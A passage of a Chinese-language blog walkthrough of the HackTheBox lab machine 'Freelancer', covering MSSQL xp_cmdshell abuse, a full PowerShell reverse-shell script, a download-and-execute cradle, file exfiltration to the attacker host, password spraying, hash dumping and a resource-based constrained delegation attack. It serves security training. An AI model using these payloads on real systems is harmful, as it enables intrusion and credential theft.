+</span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031162246707-191596372.png" alt="image-20241031162238631"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">EXECUTE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="p">;</span><span class="w"> </span><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031162256855-652593550.png" alt="image-20241031162249651"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">EXECUTE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="n">whoami</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031162307485-1009571644.png" alt="image-20241031162300569"></p>
+<p>接着执行命令获取shell，但是测试后发现有杀软</p>
+<p>准备一个ps1脚本（找了好久才找到，大多数都被杀了，人都麻了）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#shell.ps1</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c"># Delay before establishing network connection, and between retries</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Start-Sleep</span> <span class="n">-Seconds</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c"># Connect to C2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$TCPClient</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.10.16.4&#39;</span><span class="p">,</span><span class="mf">8888</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">until</span> <span class="p">(</span><span class="nv">$TCPClient</span><span class="p">.</span><span class="n">Connected</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$NetworkStream</span> <span class="p">=</span> <span class="nv">$TCPClient</span><span class="p">.</span><span class="py">GetStream</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$StreamWriter</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="py">StreamWriter</span><span class="p">(</span><span class="nv">$NetworkStream</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Writes a string to C2</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">WriteToStream</span> <span class="p">(</span><span class="nv">$String</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c"># Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$script:Buffer</span> <span class="p">=</span> <span class="mf">0</span><span class="p">..</span><span class="nv">$TCPClient</span><span class="p">.</span><span class="py">ReceiveBufferSize</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="mf">0</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c"># Write to C2</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$StreamWriter</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$String</span> <span class="p">+</span> <span class="s1">&#39;SHELL&gt; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$StreamWriter</span><span class="p">.</span><span class="py">Flush</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Initial output to C2. The function also creates the inital empty byte array buffer used below.</span>
+</span></span><span class="line"><span class="cl"><span class="n">WriteToStream</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">((</span><span class="nv">$BytesRead</span> <span class="p">=</span> <span class="nv">$NetworkStream</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$Buffer</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$Buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-gt</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c"># Encode command, remove last byte/newline</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$Command</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$Buffer</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$BytesRead</span> <span class="p">-</span> <span class="mf">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c"># Execute command and save output (including errors thrown)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$Output</span> <span class="p">=</span> <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">Invoke-Expression</span> <span class="nv">$Command</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_</span> <span class="p">|</span> <span class="nb">Out-String</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c"># Write output to C2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">WriteToStream</span> <span class="p">(</span><span class="nv">$Output</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Closes the StreamWriter and the underlying TCPClient</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$StreamWriter</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
+</span></span></code></pre></div><p>启动监听</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031163434222-1715803624.png" alt="image-20241031163426947"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">EXECUTE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">EXECUTE</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;powershell -c iex(iwr -usebasicparsing http://10.10.16.4/shell.ps1)&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031180128183-1871641448.png" alt="image-20241031180120472"></p>
+<p>成功获得shell</p>
+<h1 id="sql_svc-mikasaackerman">
+<a class="header-anchor" href="#sql_svc-mikasaackerman"></a>
+sql_svc-&gt;mikasaAckerman
+</h1><p>先简单查看一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031181451778-69892735.png" alt="image-20241031181444181"></p>
+<p>在<code>C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU</code>目录下的<code>sql-Configuration.INI</code>文件中找到俩密码<code>IL0v3ErenY3ager</code>和<code>t3mp0r@ryS@PWD</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031182535485-866862623.png" alt="image-20241031182527902"></p>
+<p>将<code>C:\Users</code>中的用户名保存到<code>users</code>文件中，密码保存至<code>passwd</code>文件中，尝试密码喷洒</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crackmapexec smb freelancer.htb -u users -p passwd
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031183827237-1394554085.png" alt="image-20241031183819307"></p>
+<p>找到一组正确的凭据<code>mikasaAckerman:IL0v3ErenY3ager</code></p>
+<p>但是<code>winrm</code>并没有成功的凭据</p>
+<p>使用<a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>进行横向，先上传至靶机</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">curl </span><span class="mf">10.10</span><span class="p">.</span><span class="py">16</span><span class="p">.</span><span class="mf">4</span><span class="p">/</span><span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span> <span class="n">-outfile</span> <span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031185139899-1944749946.png" alt="image-20241031185131983"></p>
+<p>靶机执行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span> <span class="n">mikasaAckerman</span> <span class="s2">&#34;IL0v3ErenY3ager&#34;</span> <span class="n">-d</span> <span class="n">freelancer</span><span class="p">.</span><span class="py">htb</span> <span class="n">cmd</span> <span class="n">-r</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">16</span><span class="p">.</span><span class="mf">4</span><span class="err">:</span><span class="mf">8889</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031185732331-1762507818.png" alt="image-20241031185724497"></p>
+<p>成功获得<code>mikasaackerman</code>用户权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031185853820-131256646.png" alt="image-20241031185846521"></p>
+<p>在<code>Desktop</code>找到<code>user.txt</code></p>
+<h1 id="mikasaackerman-lorra199">
+<a class="header-anchor" href="#mikasaackerman-lorra199"></a>
+mikasaAckerman-&gt;lorra199
+</h1><p>在<code>mikasaAckerman</code>桌面还有两个文件，其中一个是压缩包</p>
+<p>先看下<code>mail.txt</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031190704941-974279194.png" alt="image-20241031190657225"></p>
+<p>通过smb文件共享来传输文件，这里使用<code>httpuploadexfil</code>工具实现</p>
+<p>先在攻击机建立监听</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./httpuploadexfil :9999 /root/HackTheBox/Freelancer/share
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031192056276-848032017.png" alt="image-20241031192048419"></p>
+<p>靶机执行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">curl </span><span class="o">-F</span> <span class="s2">&#34;file=@MEMORY.7z&#34;</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">16</span><span class="p">.</span><span class="mf">4</span><span class="err">:</span><span class="mf">9999</span><span class="p">/</span><span class="n">p</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031192808087-2027884009.png" alt="image-20241031192800564"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031193202144-454390878.png" alt="image-20241031193154701"></p>
+<p>解压后发现是个 <code>DMP</code>文件</p>
+<p>使用<a href="https://github.com/ufrisk/MemProcFS">MemProcFS</a>进行分析</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./memprocfs -device /root/HackTheBox/Freelancer/share/MEMORY.DMP -mount /root/HackTheBox/Freelancer/dmp_mnt
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031194502165-752955147.png" alt="image-20241031194454182"></p>
+<p>将其挂载到一个空目录，在切换终端查看该目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031194557174-879320302.png" alt="image-20241031194549629"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031194716386-270783784.png" alt="image-20241031194708714"></p>
+<p>发现在<code>registry/hive_files</code>目录下找到SAM、SYSTEM和SECURITY文件</p>
+<p>使用<code>secretsdump</code>导出hash值</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive <span class="nb">local</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031194947565-950391359.png" alt="image-20241031194939897"></p>
+<p>发现在最下面有一串明文密码<code>PWN3D#l0rr@Armessa199</code></p>
+<p>继续尝试密码喷洒</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031195259082-1047005503.png" alt="image-20241031195251538"></p>
+<p>找到一组凭据<code>lorra199:PWN3D#l0rr@Armessa199</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031201223159-1255973466.png" alt="image-20241031201215390"></p>
+<p>winrm发现也可以使用，直接使用<code>evil-winrm</code>登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031201409985-1471373558.png" alt="image-20241031201402294"></p>
+<p>成功登录<code>lorra199</code>用户</p>
+<h1 id="权限提升">
+<a class="header-anchor" href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87"></a>
+权限提升
+</h1><h2 id="bloodhound信息收集">
+<a class="header-anchor" href="#bloodhound%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+bloodhound信息收集
+</h2><p>先使用<code>bloodhound-python</code>信息搜集</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -ns 10.10.11.5 --dns-tcp -d freelancer.htb -u lorra199 -p PWN3D#l0rr@Armessa199 -c All --zip
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031202047153-583515341.png" alt="image-20241031202039091"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031204334572-282778564.png" alt="image-20241031204327239"></p>
+<p>发现<code>lorra199</code>用户属于<code>AD RECYCLE BIN</code>组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031205200402-623938844.png" alt="image-20241031205153099"></p>
+<p>同时还注意到<code>AD RECYCLE BIN</code>组对<code>DC</code>有<code>GenericWrite</code>权限，可以修改该账户的属性，包括设置或更改允许委派到的服务列表，这可以间接实现约束委派（RBCD）</p>
+<h2 id="rbcd">
+<a class="header-anchor" href="#rbcd"></a>
+RBCD
+</h2><blockquote>
+<p>在计算机对象上滥用 <code>GenericWrite</code> 的一种方法是在域上创建一台假计算机，然后写入 DC，该假计算机能够作为 DC 进行委派（使用基于资源的约束委派 （RBCD））。然后，我可以作为 DC 请求票证并充当 DC。</p>
+</blockquote>
+<ul>
+<li>添加计算机</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">addcomputer.py -computer-name <span class="s1">&#39;Ya$&#39;</span> -computer-pass <span class="s1">&#39;Aa123456!&#39;</span> -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:<span class="s1">&#39;PWN3D#l0rr@Armessa199&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031205840693-1296189239.png" alt="image-20241031205832864"></p>
+<ul>
+<li>使用RBCD，如果这台 PC 属于“域管理员”组，我们将授予它冒充为用户“管理员”的权限</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rbcd.py -delegate-from <span class="s1">&#39;Ya$&#39;</span> -delegate-to <span class="s1">&#39;DC$&#39;</span> -dc-ip 10.10.11.5 -action <span class="s1">&#39;write&#39;</span> <span class="s1">&#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031210246405-289400388.png" alt="image-20241031210239085"></p>
+<ul>
+<li>使用getST获取服务票证以访问服务CIFS</li>
+</ul>
+<p>在请求票据之前，先与服务器时间同步</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ntpdate -s freelancer.htb
+</span></span></code></pre></div><p>再请求票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getST.py -spn <span class="s1">&#39;cifs/dc.freelancer.htb&#39;</span> -dc-ip 10.10.11.5 -impersonate <span class="s1">&#39;administrator&#39;</span> <span class="s1">&#39;freelancer.htb/Ya:Aa123456!&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031211232406-563143332.png" alt="image-20241031211224615"></p>
+<p>导入票据，然后使用secretdump获取hash值</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py <span class="s1">&#39;freelancer.htb/Administrator@DC.freelancer.htb&#39;</span> -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntl
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031211643068-790736658.png" alt="image-20241031211635032"></p>
+<p>最后<code>evil-winrm</code>登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i freelancer.htb -u administrator -H <span class="s1">&#39;0039318f1e8274633445bce32ad1a290&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031211735148-656830288.png" alt="image-20241031211727679"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031211810839-438087994.png" alt="image-20241031211803217"></p>
+<p>在<code>Desktop</code>找到<code>root.txt</code></p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/windows"
+        rel="tag"
+        >WINDOWS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/mssql"
+        rel="tag"
+        >MSSQL</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/genericwrite"
+        rel="tag"
+        >GENERICWRITE</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/rbcd"
+        rel="tag"
+        >RBCD</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_10.webp"
+              data-sizes="auto"
+              alt="网鼎杯 青龙组 2024"
+              class="lazyload"
+            /><a
+          href="/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-2024/"
+          aria-label="前一篇:网鼎杯 青龙组 2024"
+          title="前一篇:网鼎杯 青龙组 2024"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">网鼎杯 青龙组 2024</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_86.webp"
+              data-sizes="auto"
+              alt="鹏城杯 2024"
+              class="lazyload"
+            /><a
+          href="/post/%E9%B9%8F%E5%9F%8E%E6%9D%AF-2024/"
+          aria-label="后一篇:鹏城杯 2024"
+          title="后一篇:鹏城杯 2024"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">鹏城杯 2024</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a>
+      <ul>
+        <li><a href="#nmap扫描">nmap扫描</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#80端口">80端口</a></li>
+      </ul>
+    </li>
+    <li><a href="#获得网站admin权限">获得网站admin权限</a></li>
+    <li><a href="#mssql通过rce获得shell">MSSQL通过RCE获得shell</a></li>
+    <li><a href="#sql_svc-mikasaackerman">sql_svc-&gt;mikasaAckerman</a></li>
+    <li><a href="#mikasaackerman-lorra199">mikasaAckerman-&gt;lorra199</a></li>
+    <li><a href="#权限提升">权限提升</a>
+      <ul>
+        <li><a href="#bloodhound信息收集">bloodhound信息收集</a></li>
+        <li><a href="#rbcd">RBCD</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
